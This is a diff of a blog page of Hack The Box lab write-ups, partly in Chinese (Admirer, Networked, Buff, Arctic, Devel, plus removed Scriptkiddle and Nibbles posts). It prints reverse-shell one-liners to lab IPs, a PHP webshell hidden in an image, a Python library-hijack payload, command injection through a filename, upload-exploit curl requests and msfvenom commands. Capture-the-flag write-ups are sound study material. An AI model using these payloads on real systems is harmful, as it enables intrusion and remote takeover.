src="/2022/08/30/Admirer/password3.png"><br><code>$servername = &quot;localhost&quot;; $username = &quot;waldo&quot;; $password = &quot;&amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;&quot;; $dbname = &quot;admirerdb&quot;;</code><br>可以成功进行登录<br><img src="/2022/08/30/Admirer/web.png"><br>用新拿到的密码尝试ssh进行登录<br>可以登录进去<br><img src="/2022/08/30/Admirer/user.png"></p>
+<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><p>先sudo<br><img src="/2022/08/30/Admirer/sudo.png"><br>这个脚本的所有者是SETENV<br>在备份网站的时候，该脚本调用了backup.py<br>说明backup.py是以root权限运行的</p>
+<h4 id="python库劫持-https-rastating-github-io-privilege-escalation-via-python-library-hijacking"><a href="#python库劫持-https-rastating-github-io-privilege-escalation-via-python-library-hijacking" class="headerlink" title="(python库劫持)[https://rastating.github.io/privilege-escalation-via-python-library-hijacking/]"></a>(python库劫持)[<a target="_blank" rel="noopener" href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/]">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/]</a></h4><p>该备份脚本用的是python3则可以键入<br><code>python3 -c &quot;import sys; print(&#39;\n&#39;.join(sys.path))&quot;</code><br>结果会出现一个空行<br>该行会在运行时脚本所在的当前目录填进去<br>如果我们设置一个$PYTHONPATH<br>则运行上面一条命令时会把$PYTHONPATH先填进去<br><img src="/2022/08/30/Admirer/pypath.png"><br>这说明python会先尝试寻找脚本所在目录然后是自己定义的目录然后尝试去导入shutil模块<br>找一个可写的目录<br><code>find / -type d -writable 2&gt;/dev/null | grep -v -e &#39;^/proc&#39; -e &#39;/run&#39;</code><br>重写一个shutil.py<br>    import os<br>    def make_archive(a, b, c):<br>        os.system(“nc 10.10.14.4 1234 -e’&#x2F;bin&#x2F;sh’”) </p>
+<p>将脚本传到目标机的&#x2F;var&#x2F;tmp中<br><code>sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6</code>得到反弹的shell</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/15/Forlic/" data-id="cl7edtt460004jtcp6ovpgrm9" data-title="Forlic" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/08/30/Admirer/" data-id="cl7irmudb0000d2cp6aln0d9n" data-title="Admirer" class="article-share-link">Share</a>
       
       
       
@@ -485,10 +513,10 @@ we can first see what's configured
 
 
   
-    <article id="post-Scriptkiddle" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Networked" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/14/Scriptkiddle/" class="article-date">
-  <time class="dt-published" datetime="2022-07-15T03:07:06.000Z" itemprop="datePublished">2022-07-14</time>
+    <a href="/2022/08/30/Networked/" class="article-date">
+  <time class="dt-published" datetime="2022-08-30T05:20:19.000Z" itemprop="datePublished">2022-08-30</time>
 </a>
     
   </div>
@@ -499,7 +527,7 @@ we can first see what's configured
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/14/Scriptkiddle/">Scriptkiddle</a>
+      <a class="p-name article-title" href="/2022/08/30/Networked/">Networked</a>
     </h1>
   
 
@@ -507,172 +535,242 @@ we can first see what's configured
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><p>nmap -sCV –min-rate&#x3D;10000 -p- 10.10.10.226<br><img src="/2022/07/14/Scriptkiddle/nmap.png" width="50%"></p>
-<h4 id="2-site"><a href="#2-site" class="headerlink" title="2.site"></a>2.site</h4><p>in the website,it has three parts<br>the first is nmap moudle,when we type a ip,it will send back the nmap result<br>the payload section allows me to generate a payload after choose ip,os and template file<br>the third part seems like searchspolit moudle</p>
-<h5 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h5><p>when we search msfvenom, we can see it has a exploit before the version 6.0.11<br><img src="/2022/07/14/Scriptkiddle/msfvenom.png" width="50%"><br>we can have a try<br>msfvenom handles an APK template file. The idea of the template file is that you can pass msfvenom a legit .exe or .apk, and it will try to build a malicious file into that file while preserving the intended capability. This functionality allows for attackers to hide behind the legit functionality.</p>
-<h5 id="build-payload"><a href="#build-payload" class="headerlink" title="build payload"></a>build payload</h5><p>we can use searchspolit -m 49491.py to use this<br>change the payload to <code>bash -c &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39;</code> to reverse a shell<br>if the execution get wrong,first use <code>apt-get install openjdk-11-jdk-headless</code> to enable jarsigner<br>or we can use msfconsole to generate an apk,we should change the payload to <code>cmd/unix/reverse_netcat</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use msfconsole</span><br><span class="line">search msfvenom</span><br><span class="line">use 0</span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line">set lhost xxxx</span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h5 id="get-webshell"><a href="#get-webshell" class="headerlink" title="get webshell"></a>get webshell</h5><p>and we can upload the apk to the website<br>on the website “payloads” section, select Android for OS and upload the APK file that was generated by MetaSploit<br><img src="/2022/07/14/Scriptkiddle/web.png" width="50%"><br>in the &#x2F;home folder,we can find two users called kid and pwn<br><img src="/2022/07/14/Scriptkiddle/user.png" width="50%"><br>in the pwn’s folder,we can find a script called scanlosers.sh<br><img src="/2022/07/14/Scriptkiddle/scan.png" width="50%"><br>the script’s function is to scan ips written in &#x2F;home&#x2F;kid&#x2F;logs&#x2F;hackers<br>but this script doesn’t deal the input the hackers provides<br>so we can append a reverse shell command into the file<br><code>echo &quot;test ;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39; #”</code><br><img src="/2022/07/14/Scriptkiddle/pwnshell.png" width="50%"><br><img src="/2022/07/14/Scriptkiddle/pwnshell2.png" width="50%"></p>
-<h4 id="3-shell-as-root"><a href="#3-shell-as-root" class="headerlink" title="3.shell as root"></a>3.shell as root</h4><p>in the pwn,it can sudo msfconsole without password<br><img src="/2022/07/14/Scriptkiddle/root1.png" width="50%"><br>and we get the root<br><img src="/2022/07/14/Scriptkiddle/root2.png" width="50%"><br>we can exec command in msf or use <code>/bin/bash -i</code> to change to the root<br><img src="/2022/07/14/Scriptkiddle/root3.png" width="50%"></p>
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/30/Networked/nmap.png">
 
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/14/Scriptkiddle/" data-id="cl7edtt4d000cjtcph2j4c8dw" data-title="Scriptkiddle" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
+<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><img src="/2022/08/30/Networked/dirsearch.png">
 
-
-
-  
-    <article id="post-Nibbles" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/07/14/Nibbles/" class="article-date">
-  <time class="dt-published" datetime="2022-07-14T10:10:31.000Z" itemprop="datePublished">2022-07-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/14/Nibbles/">Nibbles</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><p>nmap -sCV –min-rate&#x3D;10000 -p- 10.10.10.75<br><img src="/2022/07/14/Nibbles/nmap.png" width="50%"></p>
-<h4 id="2-site"><a href="#2-site" class="headerlink" title="2.site"></a>2.site</h4><h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><p>in the website,it just has hello world,but in the source code,it hides a hint<br><code>&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</code><br>visit it</p>
-<h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><p>we use dirsearch to display its menu and we can find some pages that can visit<br><img src="/2022/07/14/Nibbles/dirsearch.png" width="50%"><br>when we visit some of them,we can get it’s machine menu<br>In exploring the resulting paths, &#x2F;nibbleblog&#x2F;content is interesting, and has dir lists enabled. Digging deeper, there’s a page at &#x2F;nibbleblog&#x2F;content&#x2F;private&#x2F;user.xml which reveals a user, admin, as well as the IPs that have tried to log in as it<br><img src="/2022/07/14/Nibbles/user.png" width="50%"></p>
-<h5 id="logging-into-admin"><a href="#logging-into-admin" class="headerlink" title="logging into admin"></a>logging into admin</h5><p>visit <a target="_blank" rel="noopener" href="http://10.10.10.75/nibbleblog/admin.php">http://10.10.10.75/nibbleblog/admin.php</a><br>we don’t have the creds,in most writeups says they guess the password or use the information get from  <a target="_blank" rel="noopener" href="http://10.10.10.75/nibbleblog/content/private/config.xml-admin-nibbles">http://10.10.10.75/nibbleblog/content/private/config.xml-admin-nibbles</a></p>
-<h5 id="Exploitaion"><a href="#Exploitaion" class="headerlink" title="Exploitaion"></a>Exploitaion</h5><p>in the settings page, we konw that the site is nibbleblog 4.0.3<br>we can use searchspolit to find some poc<br>it has a fileupload exploit<br>we use msf to get webshell<br><img src="/2022/07/14/Nibbles/msf.png" width="50%"><br>after this,we can get user.txt<br><img src="/2022/07/14/Nibbles/userflag.png" width="50%"></p>
-<h4 id="3-getting-root"><a href="#3-getting-root" class="headerlink" title="3.getting root"></a>3.getting root</h4><h5 id="first-get-a-fully-interactive-shell-using-the-python-pty-spawn-one-liner"><a href="#first-get-a-fully-interactive-shell-using-the-python-pty-spawn-one-liner" class="headerlink" title="first get a fully interactive shell using the python pty.spawn one liner"></a>first get a fully interactive shell using the python pty.spawn one liner</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<img src="/2022/07/14/Nibbles/root1.png" width="50%">
-so we can try run monitor.sh and the color of text changed
-<img src="/2022/07/14/Nibbles/root2.png" width="50%">
-
-<p><a target="_blank" rel="noopener" href="https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d">sudo trick</a><br>from this article,we can learn that how to use sudo-enabled files to open system-level tools like &#x2F;bin&#x2F;bash.<br>If you have write and execute permissions to a file that runs with elevated privileges, you can add commands such as system calls to get what you want.<br>we can use the next command to get the root</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;#! /bin/bash&quot; &gt; monitor.sh</span><br><span class="line">echo &quot;/bin/bash -i&quot; &gt;&gt; monitor.sh</span><br><span class="line">sudo ./monitor.sh</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/14/Nibbles/" data-id="cl7edtt4b000ajtcper824mse" data-title="Nibbles" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-first-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/07/13/first-blog/" class="article-date">
-  <time class="dt-published" datetime="2022-07-13T14:35:48.000Z" itemprop="datePublished">2022-07-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/13/first-blog/">first_blog</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="h1-标题"><a href="#h1-标题" class="headerlink" title="h1 标题"></a>h1 标题</h1><h2 id="h2-标题"><a href="#h2-标题" class="headerlink" title="h2 标题"></a>h2 标题</h2><h3 id="h3-标题"><a href="#h3-标题" class="headerlink" title="h3 标题"></a>h3 标题</h3><h4 id="h4-标题"><a href="#h4-标题" class="headerlink" title="h4 标题"></a>h4 标题</h4><h5 id="h5-标题"><a href="#h5-标题" class="headerlink" title="h5 标题"></a>h5 标题</h5><h6 id="h6-标题"><a href="#h6-标题" class="headerlink" title="h6 标题"></a>h6 标题</h6><h2 id="水平线"><a href="#水平线" class="headerlink" title="水平线"></a>水平线</h2><hr>
-<hr>
-<hr>
-<h2 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h2><p><strong>This is bold text</strong></p>
-<p><strong>This is bold text</strong></p>
-<p><em>This is italic text</em></p>
-<p><em>This is italic text</em></p>
-<p><del>Strikethrough</del></p>
-<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>无序</p>
+<h4 id="port-80"><a href="#port-80" class="headerlink" title="port 80"></a>port 80</h4><p>80端口只有一段文字<br>在源码里显示upload界面还未完成<br><img src="/2022/08/30/Networked/source.png"></p>
+<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>有两个比较关键的文件<br>一个是upload.php<br>一个是lib.php<br>lib.php中一共有6个函数，等会会在upload.php中被调用</p>
 <ul>
-<li>Create a list by starting a line with <code>+</code>, <code>-</code>, or <code>*</code></li>
-<li>Sub-lists are made by indenting 2 spaces:<ul>
-<li>Marker character change forces new list start:<ul>
-<li>Ac tristique libero volutpat at</li>
-</ul>
-<ul>
-<li>Facilisis in pretium nisl aliquet</li>
-</ul>
-<ul>
-<li>Nulla volutpat aliquam velit</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Very easy!</li>
-</ul>
-<p>有序</p>
-<ol>
-<li><p>Lorem ipsum dolor sit amet</p>
-</li>
-<li><p>Consectetur adipiscing elit</p>
-</li>
-<li><p>Integer molestie lorem at massa</p>
-</li>
-<li><p>You can use sequential numbers…</p>
-</li>
-<li><p>…or keep all the numbers as <code>1.</code></p>
-</li>
+<li><ol>
+<li>第一个是检查上传的文件名称<br>先按.切分<br>然后将名字命名为第一部分<br>然后把带有下划线的部分换成.<br>然后把余下的数组进行还原<br>返回一个name和一个用点隔开各单词的字符串</li>
 </ol>
-<p>Start numbering with offset:</p>
-<ol start="57">
-<li>foo</li>
-<li>bar</li>
+</li>
+<li><ol start="2">
+<li>第二个是获取上传文件名<br>内容和第一个一样</li>
 </ol>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>Inline <code>code</code></p>
-<p>Indented code</p>
-<pre><code>// Some comments
-line 1 of code
-line 2 of code
-line 3 of code
-</code></pre>
-<p>Block code “fences”</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sample text here...</span><br></pre></td></tr></table></figure>
+</li>
+<li><ol start="3">
+<li>第三个是检查ip<br>传进来一个perfix和一个文件名<br>检查ip地址是否合法</li>
+</ol>
+</li>
+<li><ol start="4">
+<li>第四个是特定功能的过滤<br>首先是一个正则表达式<br>以a-z开始后跟一个‘-’，接a-z,0-9接‘-’<br>如果有finfo函数，就自己处理一下不返回原来应该返回的东西<br>如果有mine_content_type函数也自己处理一下</li>
+</ol>
+</li>
+<li><ol start="5">
+<li>第五个上检查文件类型<br>用上面一个函数返回的文件类型匹配image<br>匹配成功就返回true</li>
+</ol>
+</li>
+</ul>
+<p>upload.php<br>先检查文件类型和文件大小<br>只能传jpg,png,gif,jpeg</p>
+<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>apache httpd中支持一个文件含有多个后缀，并为不同的后缀执行不同的命令<br>apache配置文件中如果添加了php对应的解析，则上传的文件只要包含.php就能执行<br>所以这里只要上传一个xxx.php.png，就能绕开过滤<br>把png文件用vim打开在中间插一句<code>&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</code><br>上传文件<br>成功上传并且能够显示命令<br>在传的文件后面跟?cmd&#x3D;id会显示出相应的信息<br><img src="/2022/08/30/Networked/cmd.png"></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p><code>?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 4444 &gt;/tmp/f</code><br><code>?cmd=bash+-i+%3E%26+/dev/tcp/10.10.14.3/4444+0%3E%261</code></p>
+<h4 id="guly权限"><a href="#guly权限" class="headerlink" title="guly权限"></a>guly权限</h4><p>在&#x2F;home&#x2F;guly里面有一个check_attack.php<br><img src="/2022/08/30/Networked/check.png"><br>还有一个计划任务脚本，每三分钟执行一次check_attack.php<br><img src="/2022/08/30/Networked/cron.png"><br>如果能控制$path或者$value就能实现命令注入<br>check_attack.php会检查文件但是所有不以ip开头的文件都会跳过检查<br>在uploads文件夹里新建一个<code>|nc -c bash 10.10.14.3 5555</code>文件<br>等待程序执行<br>会收到一个shell是guly权限的<br><img src="/2022/08/30/Networked/guly.png"></p>
+<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><img src="/2022/08/30/Networked/root1.png">
+查看一下sudo列表会发现有一个sh脚本可以执行
+<img src="/2022/08/30/Networked/sudo.png">
+尝试执行这个脚本会提示执行失败，但查看时确实存在该项
+<img src="/2022/08/30/Networked/root2.png">
+当输入空格分割的词汇时，会记录空格后的命令并尝试执行，可以尝试调一下/bin/bash
+得到root权限
 
-<p>Syntax highlighting</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="keyword">function</span> (<span class="params">bar</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> bar++;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(<span class="number">5</span>));</span><br></pre></td></tr></table></figure>
-<p><img src="/creds.jpg" alt="creds"></p>
-<img src="/2022/07/13/first-blog/creds.jpg" class title="This is an image">
 
-<div align="center">
-<img src="/2022/07/13/first-blog/creds.jpg" width="40%" height="30%">
-</div>
-
-<div align="left">
-<img src="/2022/07/13/first-blog/creds.jpg" width="30%">
-</div>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/13/first-blog/" data-id="cl7edtt4f000fjtcpht0h6clq" data-title="first_blog" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/08/30/Networked/" data-id="cl7fxj1na0000d5cp4j2f58uz" data-title="Networked" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Buff" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/29/Buff/" class="article-date">
+  <time class="dt-published" datetime="2022-08-30T00:58:48.000Z" itemprop="datePublished">2022-08-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/08/29/Buff/">Buff</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/29/Buff/nmap.png">
+该机器开启了8080和7680端口
+详细扫描
+<img src="/2022/08/29/Buff/nmap2.png">
+
+<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><img src="/2022/08/29/Buff/dir1.png">
+<img src="/2022/08/29/Buff/dir2.png">
+<img src="/2022/08/29/Buff/dir3.png">
+对目录进行扫描
+存在upload界面和一个register界面
+upload目前不允许访问
+可以尝试先注册一个用户
+<img src="/2022/08/29/Buff/upload1.png">
+<img src="/2022/08/29/Buff/profile.png">
+注册界面也只允许admin进行访问
+
+<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>在网页上我们可以看到这个网站是由gym management system 搭起来的<br>尝试用searchsploit搜索<br><img src="/2022/08/29/Buff/searchsploit.png"><br>尝试直接用远程代码执行<br><img src="/2022/08/29/Buff/upload2.png"><br>获得了web的权限<br>但是发现只能在该目录下活动<br>尝试一下传一个nc上去<br><img src="/2022/08/29/Buff/smb1.png"><br>开一个smb服务器上传<br><img src="/2022/08/29/Buff/nc1.png"><br><img src="/2022/08/29/Buff/nc2.png"><br>用systeminfo配合windows-exploit-suggester查看一下</p>
+<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><p><code>netstat -ano | findSTR TCP | findstr &quot;:0&quot;</code><br>使用上述命令查看架在本地端口的应用<br><img src="/2022/08/29/Buff/netstat.png"><br>有一个运行在127.0.0.1上的应用<br><code>tasklist /v | findstr 2564</code><br>通过上面这条命令查看这是什么应用<br>这里有点问题，但最后找到的进程应该是cloudme.exe<br><img src="/2022/08/29/Buff/cloudme.png"><br><img src="/2022/08/29/Buff/cloudme1112.png"><br><code>powershell -w hidden -noni -nop -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.3/chisel.exe&#39;,&#39;c.exe&#39;)&quot;</code><br>用上述指令下载chisel.exe到windows上进行端口转发<br>kali上开一个简易的http服务器<br><code>python3 -m http.server 80</code><br>然后在两边进行端口映射<br><img src="/2022/08/29/Buff/chisel.png"><br>查看poc，该poc里给出了用msfvenom生成payload的方式<br><img src="/2022/08/29/Buff/payload.png"><br><code>msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -b &#39;\x00\x0A\x0D&#39; -f python -v payload</code><br>在本地开启nc进行监听<br><img src="/2022/08/29/Buff/root.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/29/Buff/" data-id="cl7fqgxhj00000tcpfbc8c7y8" data-title="Buff" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Arctic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/29/Arctic/" class="article-date">
+  <time class="dt-published" datetime="2022-08-29T04:59:10.000Z" itemprop="datePublished">2022-08-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/08/29/Arctic/">Arctic</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/29/Arctic/nmap1.png">
+<img src="/2022/08/29/Arctic/nmap2.png">
+#### port 135
+#### port 8500
+web访问8500端口，可以看到一个目录结构，在http://10.10.10.11:8500/CFIDE/administrator/该目录下能看到一个登陆界面，且用户名是admin
+该登陆界面显示为adobe coldfusion 8
+<img src="/2022/08/29/Arctic/85001.png">
+在源码中可以看到密码上需要加密的，有一个salt
+<img src="/2022/08/29/Arctic/85002.png">
+<img src="/2022/08/29/Arctic/burp.png">
+#### get web shell
+搜索coldfusion可以找到几个可利用的文件
+<img src="/2022/08/29/Arctic/cold.png">
+看到一个可以通过msf进行文件上传的version8的漏洞利用
+直接利用显示失败
+查看该利用的源码
+在利用阶段该脚本首先上传一个文件到/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
+然后通过访问触发该文件
+于是我们可以自己制作一个jspshell并上传
+`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=8888 -f raw > shell.jsp`
+`curl -X POST -F newfile=@shell.jsp 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00`
+在传完了以后在根目录下会出现一个新的文件夹userfiles
+<img src="/2022/08/29/Arctic/web.png">
+但是该目录下并不存在刚刚上传的文件
+说明上传时触发了防御机制
+MSF脚本中上传的是txt文件，且将上传类型改为了application/x-java-archive
+`curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/abc.jsp%00'`
+<img src="/2022/08/29/Arctic/web2.png">
+可以看到这次已经上传成功了
+开一个nc监听8888端口，并访问触发该脚本
+<img src="/2022/08/29/Arctic/nc1.png">
+拿到shell权限后使用systeminfo和windows-exploit-suggester
+<img src="/2022/08/29/Arctic/shell1.png">
+用ms10-059
+用smbserver传一个MS10-059.exe到目标机器的programdata
+开一个nc监听新的端口
+<img src="/2022/08/29/Arctic/root.png">
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/29/Arctic/" data-id="cl7edtt3w0000jtcpczmx23a7" data-title="Arctic" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Devel" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/28/Devel/" class="article-date">
+  <time class="dt-published" datetime="2022-08-29T01:43:37.000Z" itemprop="datePublished">2022-08-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/08/28/Devel/">Devel</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><p>nmap -p- –min-rate 10000  10.10.10.5<br><img src="/2022/08/28/Devel/nmap1.png"><br>详细扫描21,80端口<br><img src="/2022/08/28/Devel/nmap2.png"><br>发现21端口可以进行匿名登录</p>
+<h4 id="21-port"><a href="#21-port" class="headerlink" title="21 port"></a>21 port</h4><p>ftp 10.10.10.5<br><img src="/2022/08/28/Devel/ftp1.png"><br>该网站下存在一个htm页面和一个welcome的png</p>
+<h4 id="80-port"><a href="#80-port" class="headerlink" title="80 port"></a>80 port</h4><p>80端口的默认界面是一个IIS7默认界面<br>使用dirsearch进行目录扫描<br><img src="/2022/08/28/Devel/dirsearch.png"><br>有一个aspnet_client,但是禁止访问了<br><img src="/2022/08/28/Devel/request.png"><br>请求头表示这是一个ASP.NET</p>
+<h4 id="shell-as-a-web"><a href="#shell-as-a-web" class="headerlink" title="shell as a web"></a>shell as a web</h4><p>尝试用ftp往上面传一个shell(cmd.aspx)<br><img src="/2022/08/28/Devel/ftp2.png"><br>尝试访问这个界面<br><img src="/2022/08/28/Devel/web1.png"><br><img src="/2022/08/28/Devel/web2.png"><br>本地kali开启smbserver<br><img src="/2022/08/28/Devel/smb.png"><br>共享当前文件夹并在该文件夹里面放一个nc.exe<br>在传到网站上的webshell中执行反弹程序<br><code>\\10.10.14.2\share\nc.exe -e cmd.exe 10.10.14.2 4444</code><br>并在本地开启nc进行监听，能收到反弹的shell<br><img src="/2022/08/28/Devel/webshell.png"><br>该权限是网站权限所有的user目录都不能访问</p>
+<h4 id="shell-as-root"><a href="#shell-as-root" class="headerlink" title="shell as root"></a>shell as root</h4><img src="/2022/08/28/Devel/systeminfo.png">
+查看系统信息
+<img src="/2022/08/28/Devel/windows-exploit-suggester.png">
+发现有多个可以利用的漏洞
+一个github上面有很多已经编译过的exe利用程序
+[https://github.com/abatchy17/WindowsExploits]()
+用ms11-011失败
+用ms11-046成功
+#### shell with msf
+用msfvenom 制作一个aspx上传到服务器上
+`msfvenom -p wimdows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=8888 -f shell.aspx`
+<img src="/2022/08/28/Devel/meter.png">
+<img src="/2022/08/28/Devel/meter2.png">
+<img src="/2022/08/28/Devel/meter3.png">
+<img src="/2022/08/28/Devel/meter4.png">
+<img src="/2022/08/28/Devel/meter5.png">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/28/Devel/" data-id="cl7edtt450003jtcp8iiw3r03" data-title="Devel" class="article-share-link">Share</a>
       
       
       
@@ -688,7 +786,7 @@ line 3 of code
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -707,7 +805,7 @@ line 3 of code
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
